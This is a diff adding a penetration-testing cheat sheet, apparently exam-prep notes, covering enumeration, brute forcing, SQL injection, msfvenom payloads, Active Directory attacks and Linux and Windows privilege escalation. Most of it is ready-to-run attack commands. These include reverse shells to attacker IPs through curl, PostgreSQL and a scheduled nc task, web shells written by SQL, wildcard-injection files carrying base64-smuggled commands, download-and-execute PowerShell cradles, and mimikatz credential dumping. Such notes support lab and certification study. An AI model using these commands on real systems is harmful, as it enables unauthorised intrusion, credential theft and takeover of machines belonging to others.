@@ -1,0 +1,914 @@
+================================================================================
+===Compile Binaries===
+===exe file
+i686-w64-mingw32-gcc tocompile.c -o output.exe -l[extra flags for winapi]
+===dll file 
+i686-w64-mingw32-gcc tocompile.c --shared -o output.dll -l[extra flags for winapi]
+===so file with gcc
+gcc -shared -fPIC -nostartfiles -o exp.so exp.c
+===compile without dependencies
+gcc --static -o ...
+===compile for other architectures
+sudo apt-get install gcc-multilib -y
+gcc smt.c -o smt -m32
+
+================================================================================
+===crack converters===
+===shadow & passwd
+unshadow passwd shadow > crack
+===pdf
+pdf2john file.pdf > crack
+===ssh
+ssh2john id_rsa > crack
+===keepass
+keepass2john database.kdbx > crack
+===zip
+zip2john file.zip > crack
+
+===hashcat===
+hashcat -m <hash-mode-id> <file-of-hashes> <wordlist> -r <ruleset> —force 
+#NTLM:1000
+#asreproasting:18200
+#keberoasting:13100
+#mscache: 2100 format: ($DCC2$10240#username#hash)
+	hashcat -m2100 "\$DCC2\$10240#web_svc#130379745455ae62bbf41faa0572f6d3" ...
+================================================================================
+===File Transfers===
+===nc
+#Receive
+nc -l -p 53 > out.file
+#Send
+nc -w 3 $LHOST 53 < output.txt
+
+================================================================================
+===Tunneling===
+===SSH
+ssh -N -L 0.0.0.0:$LPORT:$RHOST:$RPORT username@remotehost
+ssh -N -D 0.0.0.0:$LPORT username@tunnelhost
+ssh -N -R 127.0.0.1:$LPORT:$RHOST:$RPORT kali@kali-ip
+ssh -N -R $LPORT kali@kali-ip
+===SSHUTTLE
+sshuttle -r database_admin@192.168.238.63:2222 10.4.238.0/24 172.16.238.0/24
+===LIGOLO
+sudo ip tuntap add user kali mode tun ligolo;sudo ip link set ligolo up;proxy -selfcert -laddr 0.0.0.0:443
+.\agent.exe -connect $LHOST:443 -ignore-cert
+sudo ip route add 172.16.201.0/24 dev ligolo
+
+================================================================================
+===Nmap====
+nmap -p- -sV -sC -V --open $TARGET 
+nmap -p- -sT -sV -A $TARGET
+nmap -p- --script=vuln $TARGET
+===HTTP-Methods
+nmap --script http-methods --script-args http-methods.url-path='/website' 
+===  --script smb-enum-shares
+
+===sed===
+===ip
+grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE
+
+===port
+#comma list
+output | grep open | awk -F/ '{print $1}' ORS=','; echo
+===replace
+sed 's///g' file
+
+===Web-Requests===
+===curl
+curl -X POST -F file=@/path/to/file http://target.com
+#Post request with form values
+curl -X POST -H "Content-type:multipart/form-data" -F password="57416a3f482d92ce54d4570802ea807a" -F cmd='/bin/sh -i >& /dev/tcp/192.168.45.165/5000 0>&1' http://target.pg/wp-content/uploads/simple-file-list/7734.php
+#Upload files
+curl --data @/path/to/file
+#HTTPS
+curl -k https://
+
+===wget
+#Download 
+wget http://target.pg/resource.txt [-o output.txt]
+#Recursive download (only the current directory)
+wget -r -np http://target.pg/resource/
+
+
+
+===SSH===
+private keys: id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, id_dsa
+===Writable authorized_keys
+ssh-keygen
+cat id_rsa.pub > authorized_keys #on target
+ssh -i id_rsa -u username
+===Readable id_rsa
+chmod 0600 id_rsa
+try ssh -i id_rsa
+
+===FTP===
+===ignore prompts
+ftp -i
+===active mode
+ftp -A
+===binary encoding mode
+ftp ...@target.com
+binary
+
+===SNMP===
+===snmpwalk
+snmpwalk -v[1,2c,3] public target.pg
+#Extended scan
+snmpwalk -v2c -c public target.pg NET-SNMP-EXTEND-MIB::nsExtendObjects
+#Query OID directly
+snmpwalk -v2c -c public target.pg 1.3.6.1.4.1.8072.1.3.2.3.1.1
+===snmp-check
+snmp-check target.pg
+
+
+===SMB===
+===smbclient
+smbclient [-L] \\$TARGET\ -U user --password=pass
+===impacket-smbclient
+impacket-smbclient domain.com/username:password@target.com -target-ip target.com
+recurse ON
+prompt OFF
+===enum4linux
+enum4linux [-u user] [-p password] -a target.pg
+
+===RPC===
+===rpcclient
+rpcclient -N -U "" $TARGET
+#enumerate users
+rpcclient $> enumdomusers
+
+===rsync===
+#list shares/folder
+rsync -av --list-only rsync://target.pg
+
+#download
+rsync -av rsync://target.pg/path/to/resource /destination/path
+
+#upload
+rysnc -av /resource/to/upload rsync://target.pg/destination/path
+
+===postgresql===
+psql -h target.com -p 3567 -U username
+#list dbs 
+psql> \l
+#connect to db
+psql> \c database
+#Show full table
+psql> Select * from table_name
+#check user roles
+\du+
+
+===RCE
+#PoC
+psql> CREATE TABLE cmd_exec(cmd_output text);
+psql> COPY cmd_exec FROM PROGRAM 'id';
+psql> SELECT * FROM cmd_exec;
+psql> DROP TABLE IF EXISTS cmd_exec;
+#Reverse shell
+psql> COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
+
+===mysql===
+===connect
+mysql -h target.pg -u root
+===Exploiting
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "Document/Root/shell.php"
+===UDF PrivEsc
+#link to dlls https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
+==Linux
+#compile
+gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+#mysql commands
+use mysql;
+create table npn(line blob);
+insert into npn values(load_file('/tmp/raptor_udf2.so'));
+show variables like '%plugin%';
+select * from npn into dumpfile '/%plugin%/dir/raptor_udf2.so';
+create function sys_exec returns integer soname 'raptor_udf2.so';
+select sys_exec('chmod u+s /bin/bash');
+==Windows
+#reference: https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf
+same as linux, use dll instead of so
+
+===mssql===
+impacket-mssqlclient -port 1433 domain.com/username:password@target.com -window
+
+===webdav-server===
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/xxx/webdav/
+
+===git===
+git status
+git log
+git show <comit-id>
+
+===add user and email
+git config --global user.email "kali@kali.com"
+git config --global user.name "kali"
+
+===swaks===
+#sudo swaks -t <recipient1>@<domain> -t <recipient2>@<domain> --from <sender>@<domain> -ap --attach @beyond.Library-ms --server mail.com --body body.txt --header "Subject: sugondese" --suppress-data
+#Add an '@' infront of attachment file name if its not being sent through email
+#Can verify that file is attached & sent if swaks outputs something like
+		#-> Content-Type: application/octet-stream; name="config.Library-ms"
+		# -> Content-Description: config.Library-ms
+		# -> Content-Disposition: attachment; filename="config.Library-ms"
+		# -> Content-Transfer-Encoding: BASE64
+sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.236.189 --body body.txt --header "Subject: Staging Script" -ap
+
+================================================================================
+===URL enumeration===
+===Directories
+gobuster dir -w /wls/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u $URL -x txt,js,html,php 
+wfuzz -c -z file,/wls/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
+ffuf -w /wls/SecLists/Discovery/Web-Content/quickhits.txt -u $URL -fw 20
+===Authenticated
+wfuzz -c -z file,/wls/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"
+===Files
+gobuster dir -u $URL -w /wls/SecLists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
+===Authenticated
+wfuzz -c -z file,/wls/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"
+===Parameters
+wfuzz -c -z file,/wls/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"su
+===Subdomain
+ffuf -w /wls/subdomain-10000.txt -u http://target.pg -H "Host:FUZZ.target.pg"
+gobuster dns -d domain.org -w /wls/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
+===Custom Wordlist Generator
+cewl $URL -m [min word length] -w wordlist.txt
+cewl --lowercase $URL -w wordlist
+===nikto
+nikto -h $TARGET -o output.file 
+nikto -h $TARGET -p 80, 8080, 1234
+nikto -h $TARGET -Tuning 123dbe
+nikto --host $IP -ssl -evasion 1
+
+================================================================================
+===CMS Techniques===
+===Wordpress===
+wpscan -update
+wpscan -e --url $URL
+=== Brute force user(s)
+wpscan --url $URL -P [path/to/wordlist] -U [path/to/wordlist]
+=== enumerate example
+wpscan --url [url] --enumerate [p/vp/ap/t/vt/at] --plugins-detection aggressive
+=== scan all plugins
+wpscan --url [url] --enumerate ap --plugins-detection aggressive
+=== Scanning with Api Tokens 
+wpscan --url https://brainfuck.htb --api-token [token]
+=== Disable-tls-checks 
+wpscan --url https://brainfuck.htb --disable-tls-checks --api-token [token]
+===Panel RCE
+#Appearance editor
+Edit Appearance → Theme Editor → 404 Template
+/wp-content/themes/twentytwelve/404.php
+
+#Plugin upload
+Plugins > add new > add php web shell > install now
+/wp-content/uploads/YYYY/MM/shell.php
+
+#Upload & activate malicious plugin
+Get zip file of plugin online
+Dashboard > Plugins > Upload Plugin > Activate plugin on dashboard
+Use known exploit
+
+===Drupal===
+droopescan scan -u http://$TARGET
+
+===Joomla===
+joomscan -u http://$TARGET
+./joomlavs.rb --url http://$TARGET -a -v
+
+===Tomcat===
+===Brute Force===
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u
+
+===WebDav===
+===davtest
+davtest -url http://$TARGET
+#Upload .txt files and try to move it to other extensions
+davtest [-auth user:password] -move -sendbd auto -url $URL
+davtest [-auth user:password] -sendbd auto -url $URL ===Try to upload every extension
+===cadaver
+cadaver $TARGET #-> supply creds
+#upload
+put file
+#download
+get file
+
+
+================================================================================
+===HYDRA===
+-I : ignore any restore files
+-f : stop when a login is found
+C=/ tells hydra to establish session cookies at this URL
+F=403 tells hydra that HTTP 403 means invalid login
+
+hydra ... 'http-post-form://...:username=...:C=/:F=403'
+hydra ... 'http-post-form://...:username=...:C=/:F=error-pattern'
+
+===HTTP basic auth
+hydra -I -f -L [userlist] -P [passlist] -V -s 80 -f $TARGET http-get /url_path/ -t 15
+
+===HTTP GET
+hydra -I -f -l [user] -V -P [passlist] "http-get-form://target.pg:8080/path/to/service:username=^USER^&password=^PASS^:Incorrect-Pattern"
+
+===HTTP POST
+hydra -I -f -l [user] -V -P [passlist] "http-post-form://target.pg:8080/path/to/service:username=^USER^&password=^PASS^:Incorrect-Pattern"
+
+===Hydra BASE64-encoding
+hydra -I -f -L ~/pentest/billyboss/wordlist -V -P ~/pentest/billyboss/wordlist "http-post-form://target.pg:8081/service/rapture/session:username=^USER64^&password=^PASS64^:Incorrect"
+
+================================================================================
+===PHP Vulns===
+
+===PHP Parameter Fuzzing
+ffuf -w /wls/lfiparam -u $URL?FUZZ=php://filter/convert.base64-encode/resource=xxx.php
+
+===PHP Filter Checks.
+php://filter/convert.base64-encode/resource=
+
+===LFI fuzzing lists
+SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
+
+================================================================================
+===XSS Fuzzing===
+wfuzz -c -z file,/wls/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt "$URL"
+wfuzz -c -z file,/wls/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt "$URL"
+
+================================================================================
+===Command Injection===
+===POST data
+wfuzz -c -z file,/wls/SecLists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"
+
+===Commix
+commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent
+
+================================================================================
+===SQLi===
+
+===Manual
+---Query balancing ORDER BY
+user=1 ORDER BY [x]; until error
+--- Find rendered results in page 
+UNION SELECT 1,2...x; which number changed within the page?
+		UNION SELECT not executing? -> Try making preceding statement FALSE
+--- Find DB Name
+UNION SELECT 1, database(), 3, 4..., x
+--- Find all tables
+UNION SELECT 1, group_concat(table_name),3,...x FROM information_schema.TABLES WHERE table_schema='[db_name]'
+-- Find all column in a table
+UNION SELECT 1, group_concat(column_name),3,...x FROM information_schema.COLUMNS WHERE table_name='[table_name]'
+-- Enumerate values of a row in a column
+UNION SELECT 1, group_concat(column1, column2),3,...x FROM '[table_name]'
+#Blind SQL
+' AND IF (1=1, sleep(3), 'false'); -- 
+' UNION SELECT IF(1=1, SLEEP(5), null);-- -
+===SQLMAP
+sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
+sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
+/SecLists/Fuzzing/alphanum-case.txt
+
+===MYSQL xp_cmdshell
+EXECUTE sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'powershell -e JAB..oACkA';
+
+================================================================================
+===SMTP USER ENUM===
+smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+
+================================================================================
+===Command Execution Verification===
+tcpdump -i any -c5 icmp
+===Check Network
+netdiscover /r 0.0.0.0/24
+===INTO OUTFILE D00R
+SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
+LFI?
+===UPLOAD IMAGE
+GIF89a1
+
+==================================================================================
+===msfvenom===
+===Basic usage
+msfvenom -p <payload/type> LHOST=$LHOST LPORT=$LPORT -f <format> -o <outfile>
+===Shellcode
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f python -b "<\xBad\xBytes\xTo\xIgnore>" -v shellcode
+===Examples
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=80 -f exe -o reverse.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=1234 -f exe -o reverse.exe
+#AlwaysInstallElevated msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=80 -a x64 --platform Windows -f msi -o evil.msi
+
+====================================AD========================================
+
+===kerbrute===
+#User enumeration
+.\kerbrute userenum -d target.com /wls/SecLists/Usernames/xato-net-10-million-usernames.txt --dc dc01.target.com
+#Password Spray
+.\kerbrute passwordspray -d target.com users.txt Password123
+
+===NXC===
+nxc [smb/ftp/ssh/rdp...] mail.com -u john -p password-list [--continue-on-success]
+===local auth===
+nxc [smb/ftp/ssh/rdp...] ... --local-auth
+===Modules
+nxc smb -M mimikatz target.com -u user -p pass --server-port 5000
+===Enable rdp
+nxc smb files02.medtech.com -u joe -p Flowers1 -M rdp -o ACTION=enable
+===Command execution
+nxc smb ... -x 'whoami'
+===Force smbexec
+nxc smb ... -x 'whoami' --exec-method smbexec
+===Execute commands through PowerShell (admin privileges required)
+nxc smb ... -X 'whoami'
+===winrm
+nxc winrm target.com -u user -p password -x whoami
+===ldap
+#dumping LAPS password
+nxc ldap target.pg -u user -p pass --kdcHost dc01.oscp -M laps
+
+===LDAP===
+===ldapsearch
+#get naming contexts
+ldapsearch -x -H ldap://$TARGET -s base namingcontexts
+#anonymous query
+ldapsearch -x -H ldap://$TARGET -b "dc=hutch,dc=offsec"
+
+===Username Enumeration===
+===kerbrute
+.\kerbrute userenum -d target.com /wls/SecLists/Usernames/xato-net-10-million-usernames.txt --dc dc01.target.com
+===ldap
+ldapsearch -x -H ldap://$TARGET -b "dc=hutch,dc=offsec" | grep 'userPrincipalName' | tr '@' ' ' | awk '{print $2}'
+===GetADUsers (with credentials)
+impacket-GetADUsers -all -dc-ip dc01.ip domain.oscp/username:Password
+
+===GetNPUsers
+#Check for disabled pre-auth
+impacket-GetNPUsers target.pg/user:password -dc-ip dc01.ip
+
+===Manual Kerberoasting/Asreproasting===
+---Enumerating kerberoastable users---
+
+===kerbrute
+look out for "[NOT PREAUTH]" in user enumeration
+
+---With access to a domain account---
+===rubeus 
+.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
+.\Rubeus.exe kerberoast /outfile:kebhash
+
+===Invoke-Rubeus.ps1
+Invoke-Rubeus -Command "asreproast"
+
+===PowerView
+#Invoke-Kerberoast
+Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+
+---With Credentials of a domain account---
+===nxc
+nxc ldap ms01.oscp.exam -u dmzadmin -p SlimGodhoodMope --kdcHost dc01.oscp.exam --[kerberoasting/asreproast] output
+
+===GetNPUsers (ASReproast)
+#NO PRE-AUTH
+impacket-GetNPUsers domain.com/user -dc-ip dc01.ip -no-pass
+
+---OTHER METHODS---
+Kerberoasting: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
+Asreproasting: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
+
+===Domain Enumeration===
+
+===Bloodhound
+#Remote
+bloodhound-python -d heist.offsec -u enox -p california -c all -ns 192.168.153.165
+
+#Start bloodhound-server
+bloodhound
+#Start neo4j
+sudo neo4j console
+
+================================LINUX PE=====================================
+
+===system enumeration===
+#System versions
+uname -a
+lsb_release -a
+cat /proc/version
+cat /etc/issue
+cat /etc/os-release
+
+#Environment vars
+env
+
+#Check history
+history
+
+#Networking info
+netstat -ntplu
+ss -ntplu
+ss -anp
+routl
+
+#Find SUID binaries
+find / -type f -perm -04000 -ls 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+#Finding stuff
+find / -type <[d/f]> -name <"pattern*"> 
+find / -writable -type [d/f] 
+
+#Check perms
+sudo -l
+
+===Shadow & Passwd===
+ls -l /etc/shadow
+===crack shadow
+unshadow passwd shadow > crackthis
+john --wordlist=/wls/rockyou.txt crackthis
+
+#Capabilities
+getcap -r / 2>/dev/null
+
+#List cron jobs
+cat /etc/crontab #-> CHECK THE PATH variable in the cron file!!
+ls -lah /etc/cron*
+crontab -l
+
+#Observe service footprints
+pspy64
+watch -n 1 "ps -aux | grep pass"
+sudo tcpdump -i lo -A | grep "pass"
+
+#Check paths
+echo $PATH
+
+===check NFS===
+cat /etc/exports -> check for no_root_squash
+
+===wildcard injection===
+===tar
+echo 'chmod u+s /bin/bash' > pwn.sh
+chmod +x pwn.sh
+touch "/path/to/folder/--checkpoint=1"
+touch "/path/to/folder/--checkpoint-action=exec=sh pwn.sh"
+
+===rm
+#won't work if is something like `rm /full/path/*'
+#/bin/bash
+touch "somefile ; echo 'Y2htb2QgdStzIC9iaW4vYmFzaA=='| base64 -d |bash)"
+#/usr/bin/bash
+touch "somefile ; echo 'Y2htb2QgdStzIC91c3IvYmluL2Jhc2g='| base64 -d| bash)"
+
+===rsync
+echo 'chmod u+s /bin/bash' > pwn.sh
+chmod +x pwn.sh
+touch "/path/to/folder/-e sh pwn.sh"
+
+===writable apt.conf.d===
+echo 'apt::Update::Pre-Invoke {"chmod u+s /usr/bin/bash"};' > /etc/apt/apt.conf.d/pwn
+
+===Unauth arbitrary write===
+===/etc/sudoers
+current_user ALL=(ALL) NOPASSWD: ALL
+===/etc/shadow
+openssl passwd -1 -salt <newsalt> <newpassword> 
+#Append to /etc/shadow
+<new-user>:<hash>:0:0:root:/root:/bin/bash
+
+
+================================WINDOWS PE=====================================
+===pwn.ps1===
+powershell -ep bypass -c "iex(iwr -uri $LHOST:8000/pwn.ps1 -usebasicparsing)"
+
+===System enumeration===
+whoami /priv
+whoami /groups
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
+
+===env
+dir env:
+$env:path
+
+===ps history
+Get-History
+(Get-PSReadlineOption).HistorySavePath
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+cmd /c type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+===Interesting files===
+Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc*,*.log,*.ps1,*.kdbx,*.exe -File -Recurse -ErrorAction SilentlyContinue
+dir /a C:\
+dir /a $HOME
+Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-Childitem -Recurse C:\inetpub | findstr -i "directory config txt aspx ps1 bat xml pass user ini"
+
+===Installed applications
+#32-bit
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+#64-bit
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+===permissions on path
+for %A in ("%path:;=";"%") do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
+
+===running services
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where { $_.PathName -notlike "C:\Windows*" } | select Name,DisplayName,StartMode,PathName
+
+===Unquoted Services===
+wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
+
+===Scheduled tasks===
+#Powershell
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+Get-Process Scheduler -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
+#cmd
+cmd /c schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Run As User" /C:"Schedule" /C:"Scheduled Task State" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment"
+
+===Password Hunting===
+===Unattend Files
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.xml
+C:\Windows\system32\sysprep\sysprep.xml
+
+===Alternate Data Streams (ADS)
+dir /R
+more < NothingToSeeHere.txt:secret.txt:$DATA
+
+===Files & Contents
+#files
+dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*
+
+#content enumeration
+findstr /SI "passw pwd" *.xml *.ini *.txt *.ps1 *.bat *.config
+
+===SAM & SYSTEM
+cd C:\ & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK
+
+===Registry
+reg query [HKLM/HKCU] /f [password/pw/pwd/pass] /t REG_SZ /s
+reg query HKCU /f pwd /t REG_SZ /s
+
+#3rd party programs
+#SNMP
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+#Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+#WinVNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+#Autologons
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+===Stored Creds
+cmdkey /list
+
+===internal services
+netstat -ano
+
+===Registry===
+===Autoruns
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+===AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msiexec /quiet /qn /i C:\path\to\malicious.msi
+===Weak Registry Permissions
+#Qeury reg key permission
+accesschk64.exe "%USERNAME%" -kvuqsw hklm\System\CurrentControlSet\services -accepteula
+accesschk64.exe "Everyone" -kqswvu hklm\System\CurrentControlSet\services -accepteula
+accesschk64.exe "Authenticated Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula
+accesschk64.exe "BUILTIN\Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula
+accesschk64.exe "NT AUTHORITY\INTERACTIVE" -kqswvu hklm\System\CurrentControlSet\services -accepteula
+
+===Startup Apps===
+icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+===DLL Hijacking===
+#Load order
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory.
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+#Xfer binary to windows & observe in procmon
+
+#Windows 7,8
+default DLL called wlbsctrl.dll that is “NOT FOUND”
+#Windows 10
+missing DLL for the Task Scheduler service called wptsExtensions.dll
+need shutdown privileges
+
+===Exploits===
+===SeImpersonate
+#GodPotato
+.\gp4.exe -cmd "cmd /c whoami"
+#PrintSpoofer
+.\PrintSpoofer64.exe -i -c powershell.exe
+#JuicyPotato
+.\Juicy.Potato.x86.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
+
+===SeManageVolume
+https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
+.\SeManageVolumeExploit.exe
+
+#Replace C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll#
+$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+$object = [Activator]::CreateInstance($type)
+
+#Replace C:\Windows\System32\Wbem\tzres.dll#
+systeminfo
+
+===UAC-Bypass===
+#Writeup: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
+#Tools: https://github.com/turbo/zero2hero
+	https://github.com/CsEnox/EventViewer-UACBypass
+	https://github.com/hfiref0x/UACME
+	
+===Enumerating UAC
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+	EnableLUA: if 0, no need bypass just psexec. If 1, Check other 2 keys
+	ConsentPromptBehaviourAdmin 0,2 or 5
+	PromptOnSecureDesktop 0 or 1
+
+===Bypass
+#edit zero2hero.c
+/*
+GetCurrentDirectory(MAX_PATH, curPath);
+strcat(curPath, "\\reverse-shell.exe");
+*/
+#compile
+x86_64-w64-mingw32-gcc zero2hero.c -o zero2hero.exe
+#exploit
+.\zero2hero.c
+
+===Priv recovery===
+===FullPowers
+.\FullPowers.exe "powershell -ep Bypass"
+===Manual
+#Create list of privileges
+[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"
+#Create Principal for the task
+$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
+#Create action for task
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""
+#Create task
+Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal
+#Start Task 
+Start-ScheduledTask -TaskName "GrantAllPerms"
+
+
+
+
+===Auto-Enumeration===
+===PowerView
+Get-Domain
+Get-NetUser | Select key1,key2 etc
+Get-NetGroup "Group Name"
+===Computer info
+Get-NetComputer
+===Scan network to find where current use has admin perms
+Find-LocalAdminAccess
+===Enumerate Logged in sessions
+Get-NetSession -ComputerName files04 -Verbose
+===Enumerate SPNs in domain
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+DomainTrustMapping
+Get-DomainComputer -Domain *domain* | Resolve-IPAddress
+
+
+==================================================================================
+
+===windows download===
+===single file
+certutil.exe -urlcache -f http://$LHOST:8000/
+powershell iwr -uri $LHOST:8000/ -OutFile out
+===loop for multi files
+$baseUrl = "http://$LHOST/"
+$fileNames = ("PowerUp.ps1", "PowerView.ps1", "mimikatz.exe")
+$downloadPath = "C:\Windows\Temp "
+foreach ($fileName in $fileNames) 
+{
+	$url = $baseUrl + $fileName
+	$filePath = Join-Path $downloadPath $fileName
+	Invoke-WebRequest -uri $url -OutFi1e $filePath
+	Write-Host "Downloaded $fileName to $filePath"
+}
+
+===start non-interactive process===
+Start-Process -NoNewWindow -FilePath C:\Windows\Temp\shell.exe
+
+===Fix Path===
+set PATH=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+
+===Tools===
+===SharpView
+#Get all domains
+$domains = "*domain1*","*domain2*","*domain3*"
+foreach ($domain in $domains) (Get-DomainCompuer -Domain domain | Resolve-IPAddress)
+===PowerUp
+Invoke-AllChecks
+===SharpUp
+===Bloodhound
+iex(new-object net.webclient).downloadstring("http://$LHOST:8000/Invoke-Sharphound.ps1"); Invoke-Sharphound - CollectionMethod All,GPOLocalGroup -Domain *domain*; Invoke-Sharphound -CollectionMethod All -Domain *domain*
+
+===Dumping Hashes===
+===MIMIKATZ
+token::elevate
+privilege::debug
+log *logfile*
+sekurlsa::logonpasswords
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+#specify SAM & SYSTEM
+lsadump::sam /system:C:\Windows\Repair\SYSTEM /sam:C:\Windows\Repair\SAM
+
